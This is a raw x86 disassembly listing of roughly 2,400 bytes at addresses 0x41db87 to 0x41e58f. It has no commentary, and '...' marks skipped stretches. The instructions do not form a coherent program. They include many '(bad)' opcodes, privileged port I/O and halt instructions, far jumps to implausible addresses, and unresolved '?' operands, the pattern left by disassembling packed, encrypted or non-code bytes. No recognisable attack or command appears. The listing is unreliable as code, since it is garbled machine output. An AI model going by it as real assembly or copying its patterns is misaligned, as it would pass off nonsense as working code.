  41db87:	adc    cl,BYTE PTR [ecx+edi*1]
  41db8a:	maskmovq mm4,(bad)
  41db8b:	mul    DWORD PTR [esi+0x29]
  41db8e:	sub    dl,BYTE PTR [edx+0x1933a136]
  41db94:	mov    al,0x7d
  41db96:	test   eax,0x5e129de0
  41db9b:	dec    ebx
  41db9c:	jle    0x41db29
  41db9e:	xlat   BYTE PTR ds:[ebx]
  41db9f:	loopne 0x41dbcd
  41dba1:	rol    DWORD PTR [ebp+0x441d9ad8],0xa0
  41dba8:	add    DWORD PTR [ecx],ebx
  41dbaa:	int3   
  41dbab:	les    edi,FWORD PTR [edx-0xb788aba]
  41dbb1:	cs outs dx,BYTE PTR gs:[esi]
  41dbb4:	scas   al,BYTE PTR es:[edi]
  41dbb5:	xchg   edi,eax
  41dbb6:	das    
  41dbb7:	add    esi,edx
  41dbb9:	lock mov edx,0x30587ac1
  41dbbf:	pop    edx
  41dbc0:	dec    ecx
  41dbc1:	sbb    eax,0x59668048
  41dbc6:	js     0x41dbec
  41dbc8:	pop    ss
  41dbc9:	gs dec ebp
  41dbcb:	lds    ebp,FWORD PTR [edx+0x6566c682]
  41dbd1:	xchg   edx,eax
  41dbd2:	hlt    
  41dbd3:	xor    BYTE PTR [ebx],al
  41dbd5:	(bad)  
  41dbd6:	jg     0x41dc4b
  41dbd8:	stos   DWORD PTR es:[edi],eax
  41dbd9:	pushf  
  41dbda:	xchg   ecx,eax
  41dbdb:	dec    esi
  41dbdc:	fs push ebx
  41dbde:	lds    esp,FWORD PTR [ebx*1-0x5177c7e]
  41dbe5:	cmp    ebx,ebp
  41dbe7:	es inc eax
  41dbe9:	mov    bl,BYTE PTR [esi]
  41dbeb:	shr    edi,1
  41dbed:	cld    
  41dbee:	loop   0x41dba0
  41dbf0:	fadd   QWORD PTR [eax+0x5df3dd25]
  41dbf6:	xchg   ecx,eax
  41dbf7:	jae    0x41dbe4
  41dbf9:	fmul   QWORD PTR [ebx]
  41dbfb:	fistp  DWORD PTR [ecx]
  41dbfd:	cmc    
  41dbfe:	mov    cl,0xf1
  41dc00:	sar    al,0x74
  41dc03:	enter  0xe667,0xe7
  41dc07:	push   0xcf3d1443
  41dc0c:	dec    ebp
  41dc0d:	sbb    DWORD PTR ds:0xd102,edx
	...
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi-0x6c4f2fb0]
  41dc81:	gs inc ebx
  41dc83:	(bad)
  41dc87:	add    BYTE PTR ds:0x2000001,al
  41dc8d:	ins    BYTE PTR es:[edi],dx
  41dc8e:	test   DWORD PTR [ecx-0x5c],0x6869e201
  41dc95:	jb     0x41dcf2
  41dc97:	add    DWORD PTR [eax-0x2e0886c0],0xffffffc9
  41dc9e:	or     DWORD PTR [ebp+0x7f],esp
  41dca1:	adc    bh,BYTE PTR [eax-0x3c]
  41dca4:	dec    ebp
  41dca5:	test   ebp,eax
  41dca7:	sub    DWORD PTR [ebx+0x4b],esp
  41dcaa:	add    DWORD PTR [ebx],edi
  41dcac:	fistp  WORD PTR [edx+0x7ade9e8]
  41dcb2:	dec    ebp
  41dcb3:	adc    al,0x6e
  41dcb5:	inc    esi
  41dcb6:	pop    edx
  41dcb7:	div    BYTE PTR [ecx-0x43a62d5e]
  41dcbd:	in     al,0x40
  41dcbf:	mov    es,WORD PTR [eax]
  41dcc1:	es push esp
  41dcc3:	and    esi,DWORD PTR ds:0x6f48c836
  41dcc9:	popf   
  41dcca:	jle    0x41dc78
  41dccc:	out    0x62,eax
  41dcce:	and    al,0xf7
  41dcd0:	(bad)  
  41dcd2:	repz push edx
  41dcd4:	dec    ebx
  41dcd5:	(bad)  
  41dcd6:	outs   dx,BYTE PTR ds:[esi]
  41dcd7:	sub    ah,BYTE PTR [edx]
  41dcd9:	push   edx
  41dcda:	mov    ebx,0x11cc7385
  41dcdf:	in     al,0x80
  41dce1:	xor    al,0x32
  41dce3:	mov    eax,es
  41dce5:	scas   al,BYTE PTR es:[edi]
  41dce6:	push   edi
  41dce7:	out    dx,al
  41dce8:	and    edi,0xc0df648e
  41dcee:	push   esp
  41dcef:	jge    0x41dd2c
  41dcf1:	inc    esp
  41dcf2:	and    esi,DWORD PTR [edx]
  41dcf4:	mov    cl,0xf4
  41dcf6:	cmc    
  41dcf7:	sbb    DWORD PTR [edx+0xf],0x18
  41dcfb:	push   0x7cd9feb7
  41dd00:	std    
  41dd01:	and    DWORD PTR [eax+0x2f039a66],edx
  41dd07:	je     0x41dc93
  41dd09:	(bad)  
  41dd0a:	ret    
  41dd0b:	ds mov fs,esp
  41dd0e:	outs   dx,DWORD PTR ds:[esi]
  41dd0f:	sbb    DWORD PTR [edi],edi
  41dd11:	imul   edi,DWORD PTR [ebp+0x6504f09b],0xa910b55d
  41dd1b:	lahf   
  41dd1c:	push   ebp
  41dd1d:	div    DWORD PTR [edx+0x59]
  41dd20:	inc    esp
  41dd21:	cmp    DWORD PTR [ebx-0x3b067f88],edi
  41dd27:	or     ebp,DWORD PTR ds:0x809da220
  41dd2d:	mov    DWORD PTR [eax-0x34857035],esp
  41dd33:	pusha  
  41dd34:	cmp    dh,BYTE PTR [esi-0x16edd965]
  41dd3a:	mov    bh,BYTE PTR [edx]
  41dd3c:	push   es
  41dd3d:	cmp    ebp,esp
  41dd3f:	in     eax,dx
  41dd40:	push   esi
  41dd41:	xchg   esi,eax
  41dd42:	scas   eax,DWORD PTR es:[edi]
  41dd43:	adc    al,0xd9
  41dd45:	mov    ebp,0x12d69d22
  41dd4a:	into   
  41dd4b:	push   ds
  41dd4c:	mov    ecx,DWORD PTR [edx+0x34]
  41dd4f:	dec    esi
  41dd50:	sub    BYTE PTR [ecx-0x17],bh
  41dd53:	mov    esi,DWORD PTR [edx]
  41dd55:	sbb    ecx,DWORD PTR [eax]
  41dd57:	push   cs
  41dd58:	push   ss
  41dd59:	repnz pop esi
  41dd5b:	push   ebx
  41dd5c:	xor    al,0x35
  41dd5e:	cmp    al,0xd5
  41dd60:	xor    esp,ebp
  41dd62:	(bad)  
  41dd64:	ins    DWORD PTR es:[edi],dx
  41dd65:	arpl   si,sp
  41dd67:	daa    
  41dd68:	into   
  41dd69:	stos   BYTE PTR es:[edi],al
  41dd6a:	popa   
  41dd6b:	push   ss
  41dd6c:	xchg   ebx,eax
  41dd6d:	lea    edx,[esi-0x3ede07de]
  41dd73:	xor    BYTE PTR [edi],ah
  41dd75:	inc    edi
  41dd76:	in     al,dx
  41dd77:	loop   0x41dd27
  41dd79:	xor    DWORD PTR [ebp+edi*2-0x4021392d],ecx
  41dd80:	and    al,0x2f
  41dd82:	jmp    0x41ddbf
  41dd84:	push   edi
  41dd85:	xchg   ebx,eax
  41dd86:	stc    
  41dd87:	sub    dh,cl
  41dd89:	(bad)  
  41dd8b:	sbb    al,0x0
  41dd8d:	shl    bh,1
  41dd8f:	mov    ds:0xaa,eax
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	jne    0x41dd8d
  41de02:	cmp    ecx,DWORD PTR [ebp-0x12]
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	and    bl,BYTE PTR es:[eax+ebx*4+0x1e]
  41de11:	adc    ecx,esi
  41de13:	lods   al,BYTE PTR ds:[esi]
  41de14:	fdiv   DWORD PTR [ebp+0x315f52d4]
  41de1a:	dec    eax
  41de1b:	mov    bx,0xc205
  41de1f:	loop   0x41ddf4
  41de21:	push   0x15831fe
  41de26:	(bad)  
  41de27:	lock scas eax,DWORD PTR es:[edi]
  41de29:	ret    0x7641
  41de2c:	mov    al,0xcd
  41de2e:	cmp    al,0x62
  41de30:	das    
  41de31:	shl    DWORD PTR [edx],cl
  41de33:	sub    BYTE PTR [edx+edx*8],cl
  41de36:	je     0x41ddd0
  41de38:	(bad)  
  41de39:	sbb    eax,eax
  41de3b:	popf   
  41de3c:	enter  0x819c,0x48
  41de40:	out    0x5c,eax
  41de42:	push   edi
  41de43:	cdq    
  41de44:	sub    ch,cl
  41de46:	(bad)  
  41de47:	out    0x2,al
  41de49:	clc    
  41de4a:	(bad)  
  41de4b:	shl    DWORD PTR [edi+0x59],1
  41de4e:	dec    edi
  41de4f:	loope  0x41ddd9
  41de51:	ficomp DWORD PTR [edi+0x75858fbf]
  41de57:	cmc    
  41de58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de59:	or     edi,DWORD PTR [eax+0x62]
  41de5c:	call   0x8b99275c
  41de61:	icebp  
  41de62:	jge    0x41de23
  41de64:	ins    BYTE PTR es:[edi],dx
  41de65:	retf   
  41de66:	mov    al,0xb9
  41de68:	inc    eax
  41de69:	out    dx,al
  41de6a:	sbb    al,0x7f
  41de6c:	jo     0x41dec5
  41de6e:	or     BYTE PTR [ebx],ch
  41de70:	es retf 0x888d
  41de74:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41de76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de77:	xchg   ebx,eax
  41de78:	mov    es,eax
  41de7a:	retf   
  41de7b:	rol    DWORD PTR ds:0x233ebd1,0xef
  41de82:	sbb    al,0x3
  41de84:	pusha  
  41de85:	repz out 0x71,al
  41de88:	ret    
  41de89:	lods   eax,DWORD PTR ds:[esi]
  41de8a:	xchg   edx,eax
  41de8b:	frstor [esp+esi*2+0x510c447c]
  41de92:	cdq    
  41de93:	nop
  41de94:	sub    bh,BYTE PTR [ebx]
  41de96:	mov    WORD PTR [esp+ecx*1-0x57],?
  41de9a:	enter  0x9bbd,0x39
  41de9e:	test   eax,0x2a4b2174
  41dea3:	and    BYTE PTR [ebp+0x535aee82],bh
  41dea9:	loop   0x41dea5
  41deab:	repnz inc dh
  41deae:	sbb    DWORD PTR [ebp+0x43e73388],esi
  41deb4:	xchg   BYTE PTR [edi+0x50],ch
  41deb7:	dec    eax
  41deb8:	imul   ebp,ebp,0x4e
  41debb:	arpl   WORD PTR [ecx-0x28],si
  41debe:	push   ss
  41debf:	jg     0x41deb4
  41dec1:	call   0x4632721c
  41dec6:	js     0x41de95
  41dec8:	pop    edi
  41dec9:	push   esi
  41deca:	pop    edx
  41decb:	cmp    al,0x97
  41decd:	call   0xccc7978e
  41ded2:	test   eax,0xefd516d6
  41ded7:	ret    
  41ded8:	mov    cs:0xdfa03fa,al
  41dede:	(bad)  
  41dedf:	mov    ah,0x85
  41dee1:	aas    
  41dee2:	jg     0x41de96
  41dee4:	xchg   ecx,eax
  41dee5:	push   edx
  41dee6:	in     al,dx
  41dee7:	test   DWORD PTR [ebx],ebp
  41dee9:	retf   
  41deea:	inc    ebp
  41deeb:	mov    ebp,0x8ac50ecc
  41def0:	sub    BYTE PTR [esi-0x6a6a6f0d],bh
  41def6:	cs adc esp,0x24aa098c
  41defd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41defe:	xchg   ebp,eax
  41deff:	xchg   ecx,eax
  41df00:	jg     0x41dedd
  41df02:	cmp    DWORD PTR [ebp-0x2c],esi
  41df05:	and    esp,DWORD PTR [ecx+0x4a]
  41df08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df09:	adc    esp,DWORD PTR [eax]
  41df0b:	loopne 0x41de93
  41df0d:	lfs    edi,FWORD PTR [edx+ecx*1+0x0]
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xe6b89ce9
  41df82:	inc    edx
  41df83:	inc    ecx
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0xb2000001
  41df8d:	les    esi,FWORD PTR [edx]
  41df8f:	jns    0x41dfb6
  41df91:	mov    ecx,0x956249ab
  41df96:	add    ah,0xa5
  41df99:	mov    DWORD PTR [edi+0x44],ecx
  41df9c:	data16 and bl,dh
  41df9f:	jl     0x41df25
  41dfa1:	fwait
  41dfa2:	xchg   DWORD PTR [esp+ebp*1-0x34],edi
  41dfa6:	mov    ch,0xeb
  41dfa8:	jae    0x41dfcb
  41dfaa:	mov    ebx,0xa55c7818
  41dfaf:	lds    eax,FWORD PTR [edx-0x4a]
  41dfb2:	es ins DWORD PTR es:[edi],dx
  41dfb4:	adc    bh,bh
  41dfb6:	call   0x7230c8df
  41dfbb:	inc    esp
  41dfbc:	fistp  WORD PTR [edx]
  41dfbe:	sbb    ch,bh
  41dfc0:	(bad)  
  41dfc1:	mov    ebp,0xb3aaf2c0
  41dfc6:	iret   
  41dfc7:	rcr    esp,1
  41dfc9:	mov    cl,0x13
  41dfcb:	dec    esp
  41dfcc:	inc    ebp
  41dfcd:	es jno 0x41df84
  41dfd0:	mov    ecx,0x625072f9
  41dfd5:	inc    ebp
  41dfd6:	xchg   DWORD PTR [ebx+eax*8],edi
  41dfd9:	call   DWORD PTR [ecx]
  41dfdb:	sti    
  41dfdc:	or     al,0x4
  41dfde:	push   esi
  41dfdf:	push   ebp
  41dfe0:	and    BYTE PTR [eax-0x7774c44f],ch
  41dfe6:	fwait
  41dfe7:	and    dh,BYTE PTR [ebp-0x1f41bc7f]
  41dfed:	push   esi
  41dfee:	dec    eax
  41dfef:	rol    edi,0x59
  41dff2:	test   DWORD PTR [edi-0x3e],eax
  41dff5:	xchg   ebx,eax
  41dff6:	out    dx,al
  41dff7:	lds    eax,FWORD PTR [ebx-0x5e292409]
  41dffd:	mov    ?,edi
  41dfff:	inc    eax
  41e000:	push   edx
  41e001:	mov    cl,0xa6
  41e003:	rol    BYTE PTR [ecx+0x54],1
  41e006:	shl    ebp,cl
  41e008:	cdq    
  41e009:	sub    edx,esi
  41e00b:	xchg   edx,eax
  41e00c:	iret   
  41e00d:	pop    ebx
  41e00e:	scas   eax,DWORD PTR es:[edi]
  41e00f:	lock cld 
  41e011:	pop    es
  41e012:	sbb    BYTE PTR [ecx-0x5a88565c],dh
  41e018:	pushf  
  41e019:	push   ss
  41e01a:	sbb    al,dh
  41e01c:	and    edx,esp
  41e01e:	or     DWORD PTR [edx-0x6277a92f],eax
  41e024:	(bad)  
  41e026:	stos   BYTE PTR es:[edi],al
  41e027:	mov    al,0xb0
  41e029:	cmp    DWORD PTR [ebp+eax*8+0x3130add0],ecx
  41e030:	xor    edi,DWORD PTR [ebp-0x2630e2b6]
  41e036:	add    bl,0x73
  41e039:	cmp    ah,BYTE PTR [edx+0xc]
  41e03c:	push   es
  41e03d:	add    BYTE PTR [ecx+0x38],dl
  41e040:	inc    edi
  41e041:	mov    eax,ds:0xea6cba18
  41e046:	iret   
  41e047:	add    edi,edi
  41e049:	dec    edx
  41e04a:	loope  0x41dfce
  41e04c:	or     al,0xaa
  41e04e:	xchg   ebp,eax
  41e04f:	jmp    0x8c25ae9b
  41e054:	add    BYTE PTR [ebp+0x6d],dl
  41e057:	cmp    eax,0xffffffa7
  41e05a:	adc    esp,ebp
  41e05c:	push   esp
  41e05d:	add    al,0x51
  41e05f:	xchg   ecx,eax
  41e060:	push   cs
  41e061:	test   BYTE PTR [ecx+0x5f],dl
  41e064:	mov    DWORD PTR [eax-0x54f28ae3],esi
  41e06a:	jnp    0x41e0a4
  41e06c:	and    ebx,esi
  41e06e:	adc    al,0x6
  41e070:	pop    edx
  41e071:	sbb    DWORD PTR es:[eax-0x6bd026a8],eax
  41e078:	hlt    
  41e079:	jmp    0x35113081
  41e07e:	test   BYTE PTR [edx-0x2eae3de3],ah
  41e084:	inc    edx
  41e085:	scas   al,BYTE PTR es:[edi]
  41e086:	scas   al,BYTE PTR es:[edi]
  41e087:	retf   
  41e088:	mov    esi,0xa0471f32
  41e08d:	lds    ebp,FWORD PTR [edi+0xc1a1]
	...
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	jle    0x41e15e
  41e102:	xor    BYTE PTR [esi+0x13ff8],cl
  41e108:	add    eax,0xc6000001
  41e10d:	push   ecx
  41e10e:	pop    ebp
  41e10f:	push   ebx
  41e110:	pop    eax
  41e111:	ret    0xb89e
  41e114:	lds    ebx,FWORD PTR [ebx+0x4d]
  41e117:	int    0xf4
  41e119:	pop    es
  41e11a:	les    eax,FWORD PTR [eax+ebx*4+0x6f]
  41e11e:	sbb    ch,dh
  41e120:	mov    ah,0x68
  41e122:	leave  
  41e123:	jae    0x41e0fc
  41e125:	add    eax,0x52e87dc9
  41e12a:	cmp    ebx,esp
  41e12c:	sahf   
  41e12d:	js     0x41e10e
  41e12f:	outs   dx,DWORD PTR ds:[esi]
  41e130:	sbb    al,0x1a
  41e132:	dec    eax
  41e133:	sahf   
  41e134:	ins    DWORD PTR es:[edi],dx
  41e135:	adc    DWORD PTR [edx-0x34],ecx
  41e138:	(bad)  
  41e139:	lods   eax,DWORD PTR ds:[esi]
  41e13a:	mov    edi,0xd7c4e57f
  41e13f:	addr16 std 
  41e141:	scas   eax,DWORD PTR es:[edi]
  41e142:	aam    0xed
  41e144:	dec    esi
  41e145:	pop    ebx
  41e146:	das    
  41e147:	mov    cl,0x34
  41e149:	(bad)  
  41e14b:	pop    ebp
  41e14c:	mov    bh,0x79
  41e14e:	sti    
  41e14f:	outs   dx,DWORD PTR ds:[esi]
  41e150:	sbb    edi,ebx
  41e152:	stc    
  41e153:	pusha  
  41e154:	push   esi
  41e155:	xchg   esp,eax
  41e156:	loopne 0x41e0f0
  41e158:	and    bl,BYTE PTR [ebp+0x53]
  41e15b:	add    dh,0xf4
  41e15e:	jmp    0x41e1bd
  41e160:	mov    esi,0x2a0120de
  41e165:	and    eax,0x4536039e
  41e16a:	inc    ebp
  41e16c:	mov    ecx,DWORD PTR [ebp+0x3acc2f4e]
  41e172:	lods   al,BYTE PTR ds:[esi]
  41e173:	mov    al,0xdc
  41e175:	add    BYTE PTR [edx-0x6c],al
  41e178:	xlat   BYTE PTR ds:[ebx]
  41e179:	mov    esi,0x4db8976b
  41e17e:	out    0x30,eax
  41e180:	pusha  
  41e181:	mul    DWORD PTR [esi]
  41e183:	scas   eax,DWORD PTR es:[edi]
  41e184:	pop    ebp
  41e185:	adc    edi,DWORD PTR [edx+0x15]
  41e188:	sub    ebx,edx
  41e18a:	fs or  ah,ah
  41e18d:	xor    al,0x99
  41e18f:	loopne 0x41e15b
  41e191:	outs   dx,DWORD PTR ds:[esi]
  41e192:	push   esp
  41e193:	stos   DWORD PTR es:[edi],eax
  41e194:	aas    
  41e195:	or     al,0x95
  41e197:	out    dx,eax
  41e198:	call   0x27c7:0x4caf906e
  41e19f:	push   cs
  41e1a0:	int    0xbb
  41e1a2:	lea    si,[edx]
  41e1a5:	addr16 jl 0x41e221
  41e1a8:	mul    DWORD PTR fs:[eax+0x7b786cac]
  41e1af:	fwait
  41e1b0:	loop   0x41e1ce
  41e1b2:	adc    al,0xf9
  41e1b4:	dec    ebx
  41e1b5:	sbb    eax,0xf321a2fb
  41e1ba:	xor    ah,BYTE PTR [edx+0x49ed97a6]
  41e1c0:	cs fs push 0x2b
  41e1c4:	ins    BYTE PTR es:[edi],dx
  41e1c5:	fisttp QWORD PTR [eax+edx*2]
  41e1c8:	add    al,BYTE PTR [edi]
  41e1ca:	outs   dx,DWORD PTR ds:[esi]
  41e1cb:	sub    BYTE PTR [eax+eiz*8+0x7562f2b2],0xcc
  41e1d3:	push   ebx
  41e1d4:	(bad)  
  41e1d5:	xchg   esi,eax
  41e1d6:	jae    0x41e1fc
  41e1d8:	mov    ebx,0x57f5fc1a
  41e1dd:	mov    ebx,0x3ceb167f
  41e1e2:	retf   0xdc0b
  41e1e5:	mov    edi,0x7d8a3c06
  41e1ea:	xchg   esp,eax
  41e1eb:	jp     0x41e1a0
  41e1ed:	sub    ecx,DWORD PTR [ebp+ecx*1+0xa4e411e]
  41e1f4:	mov    esi,0xc35a2acd
  41e1f9:	jns    0x41e19a
  41e1fb:	imul   edi,DWORD PTR [ecx-0x2e0df0d8],0xfffffff3
  41e202:	pop    esp
  41e203:	aam    0x1e
  41e205:	(bad)  
  41e206:	(bad)  [eax-0x67de0f5d]
  41e20c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41e20e:	add    DWORD PTR [esi+0xf1],esi
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x1d
  41e281:	jmp    0x413f6b7b
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x63000001
  41e28d:	sbb    eax,0xe226850f
  41e292:	jno    0x41e285
  41e294:	stos   BYTE PTR es:[edi],al
  41e295:	pop    es
  41e296:	rcr    DWORD PTR [ecx],1
  41e298:	sbb    ebx,edi
  41e29a:	sar    BYTE PTR [edi],1
  41e29c:	and    ah,bh
  41e29e:	xchg   ecx,eax
  41e29f:	(bad)  
  41e2a0:	fld    TBYTE PTR [eax+eiz*2-0x24]
  41e2a4:	fs pushf 
  41e2a6:	repz push 0x71
  41e2a9:	dec    edi
  41e2aa:	add    esi,DWORD PTR [edx+0x23]
  41e2ad:	es sbb eax,0x35444fe8
  41e2b3:	dec    edx
  41e2b4:	xor    eax,0x93ea834a
  41e2b9:	jb     0x41e339
  41e2bb:	lods   al,BYTE PTR ds:[esi]
  41e2bc:	push   eax
  41e2bd:	dec    edi
  41e2be:	jge    0x41e295
  41e2c0:	fisubr WORD PTR [edx-0x390f96bb]
  41e2c6:	aam    0x11
  41e2c8:	lods   eax,DWORD PTR ds:[esi]
  41e2c9:	call   0xddc1078b
  41e2ce:	out    0xbc,eax
  41e2d0:	cmp    DWORD PTR [ebx],0xffffffb1
  41e2d3:	jmp    0x41e32d
  41e2d5:	imul   ebp,DWORD PTR [ecx-0x2a],0x1c978862
  41e2dc:	call   0xabfdc8be
  41e2e1:	sub    ah,ah
  41e2e3:	push   0x2d428768
  41e2e8:	adc    DWORD PTR [ecx],esi
  41e2ea:	loop   0x41e2b3
  41e2ec:	dec    esi
  41e2ed:	int    0xfa
  41e2ef:	and    eax,0x25420793
  41e2f4:	add    eax,0xadbe425f
  41e2f9:	divps  xmm5,XMMWORD PTR [eax-0xeed2a34]
  41e300:	xor    ebx,DWORD PTR [edx]
  41e302:	xchg   edx,eax
  41e303:	jl     0x41e378
  41e305:	test   al,0x31
  41e307:	and    eax,0xf293734
  41e30c:	or     DWORD PTR [edx],esi
  41e30e:	jecxz  0x41e330
  41e310:	imul   edi,DWORD PTR [esp+eiz*8],0xbb443127
  41e317:	fbstp  TBYTE PTR [ebx-0xfd7ddbf]
  41e31d:	cdq    
  41e31e:	push   ecx
  41e31f:	inc    esp
  41e320:	sbb    DWORD PTR ds:[eax+0x70253536],esp
  41e327:	and    bh,BYTE PTR [edx-0x65eb5d22]
  41e32d:	sub    DWORD PTR [edi],ebx
  41e32f:	ret    0x57fc
  41e332:	cmc    
  41e333:	fucomi st,st(4)
  41e335:	(bad)  
  41e336:	jno    0x41e2ee
  41e338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e339:	push   ecx
  41e33a:	push   ecx
  41e33b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e33c:	pop    edx
  41e33d:	retf   0xc0d2
  41e340:	mov    esp,esi
  41e342:	mov    bh,BYTE PTR [ecx-0x37a75830]
  41e348:	stos   DWORD PTR es:[edi],eax
  41e349:	(bad)  
  41e34a:	aas    
  41e34b:	leave  
  41e34c:	xor    eax,0x98b7fdff
  41e351:	out    0x80,al
  41e353:	div    BYTE PTR [eax]
  41e355:	pop    es
  41e356:	mov    WORD PTR ds:0x7844e157,cs
  41e35c:	daa    
  41e35d:	xor    DWORD PTR [edx+0x3a110c9f],eax
  41e363:	js     0x41e3b7
  41e365:	ds xchg edx,eax
  41e367:	test   DWORD PTR [esp+eax*2],ecx
  41e36a:	cmp    eax,0xe666cf20
  41e36f:	pop    ecx
  41e370:	sub    ch,BYTE PTR [ebx+ebp*4]
  41e373:	xor    ebx,edi
  41e375:	push   edx
  41e376:	mov    al,ch
  41e378:	call   0xa110:0x55431cea
  41e37f:	push   ecx
  41e380:	popa   
  41e381:	nop
  41e382:	cli    
  41e383:	out    0x2e,eax
  41e385:	add    bh,bl
  41e387:	push   eax
  41e388:	dec    eax
  41e389:	inc    ecx
  41e38a:	popf   
  41e38b:	aas    
  41e38c:	jmp    0x41e3b8
  41e38e:	push   0x33d7
	...
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x222bcf09
  41e403:	stos   DWORD PTR es:[edi],eax
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0xaa000001,al
  41e40d:	and    eax,0xfacf4290
  41e412:	push   edx
  41e413:	inc    edi
  41e414:	mov    BYTE PTR [edx-0x71ce236c],al
  41e41a:	dec    eax
  41e41b:	pushf  
  41e41c:	sub    eax,0x931cb64f
  41e421:	adc    ah,BYTE PTR [ecx+0x70447ffc]
  41e427:	mov    dl,0xb7
  41e429:	sbb    al,0x96
  41e42b:	and    edi,DWORD PTR [ecx-0x90cfa01]
  41e431:	jmp    0x318e:0x8f3def18
  41e438:	or     DWORD PTR [eax-0x80],edi
  41e43b:	pop    edi
  41e43c:	cld    
  41e43d:	xor    eax,0xcd80a0b4
  41e442:	xchg   ecx,eax
  41e443:	sbb    WORD PTR [edi-0x23],0x7cf8
  41e449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44a:	dec    ecx
  41e44b:	cmp    eax,DWORD PTR [edx]
  41e44d:	je     0x41e455
  41e44f:	mov    ?,WORD PTR [edx+0x573018ae]
  41e455:	ins    DWORD PTR es:[edi],dx
  41e456:	jne    0x41e4ad
  41e458:	adc    bh,BYTE PTR [ecx]
  41e45a:	add    dh,BYTE PTR [ebp+0x13beae77]
  41e460:	push   edx
  41e461:	test   DWORD PTR [esi],esp
  41e463:	push   ebp
  41e464:	jo     0x41e4d3
  41e466:	push   es
  41e467:	xchg   esi,eax
  41e468:	sbb    DWORD PTR [edx+0x22],eax
  41e46b:	mov    ?,WORD PTR [ebx-0x198df711]
  41e471:	cdq    
  41e472:	cmp    eax,0xc448ef72
  41e477:	and    al,0xb1
  41e479:	cld    
  41e47a:	jle    0x41e4d6
  41e47c:	dec    esi
  41e47d:	(bad)  
  41e47e:	push   ecx
  41e47f:	and    eax,0x5afb508b
  41e484:	fwait
  41e485:	cmp    ebx,DWORD PTR [ebp+0x33]
  41e488:	jmp    0x41e4a4
  41e48a:	call   0xb3b7:0x82e2bdb3
  41e491:	ror    cl,0xa0
  41e494:	fnsave [esi+ecx*4+0x10a77a07]
  41e49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e49c:	cdq    
  41e49d:	jge    0x41e493
  41e49f:	dec    esp
  41e4a0:	fild   DWORD PTR [edx-0x2e]
  41e4a3:	dec    esp
  41e4a4:	jge    0x41e51d
  41e4a6:	and    edi,DWORD PTR [ebp-0x1f]
  41e4a9:	dec    ebx
  41e4ab:	iret   
  41e4ac:	pusha  
  41e4ad:	retf   
  41e4ae:	dec    ebx
  41e4af:	idiv   DWORD PTR [ecx+edi*1]
  41e4b2:	and    eax,0xa383ea8f
  41e4b7:	shl    BYTE PTR [ebp+0x74881719],cl
  41e4bd:	or     bh,0x48
  41e4c0:	test   cl,dh
  41e4c2:	sub    eax,0xa9c2dde6
  41e4c7:	pop    es
  41e4c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4c9:	inc    edi
  41e4ca:	in     al,dx
  41e4cb:	pop    ebp
  41e4cc:	ins    BYTE PTR es:[edi],dx
  41e4cd:	pop    edx
  41e4ce:	adc    bh,ch
  41e4d0:	pop    ecx
  41e4d1:	dec    eax
  41e4d2:	push   ecx
  41e4d3:	xor    al,0xa6
  41e4d5:	into   
  41e4d6:	mov    esi,0xad3db89b
  41e4db:	retf   
  41e4dc:	pop    ebx
  41e4dd:	sub    esi,0xf4099d95
  41e4e3:	shr    BYTE PTR [ecx+0x234f2b34],1
  41e4e9:	call   0x817f37a8
  41e4ee:	push   esp
  41e4ef:	and    BYTE PTR [eax+0x20],ah
  41e4f2:	bound  esp,QWORD PTR [eax+0x51045246]
  41e4f8:	pusha  
  41e4f9:	add    ecx,DWORD PTR [edx-0x4952360]
  41e4ff:	xor    ah,BYTE PTR ds:0xa28d633b
  41e505:	popa   
  41e506:	xchg   ebp,eax
  41e507:	les    ebp,FWORD PTR [esi+0x1e]
  41e50a:	cmc    
  41e50b:	enter  0x101e,0x4e
  41e50f:	sub    al,BYTE PTR [ecx+0x0]
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e51b
  41e581:	(bad)  
  41e582:	les    edi,FWORD PTR [ebp+0x7]
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0x5a000001
  41e58d:	add    esi,edi
  41e58f:	jne    0x41e515
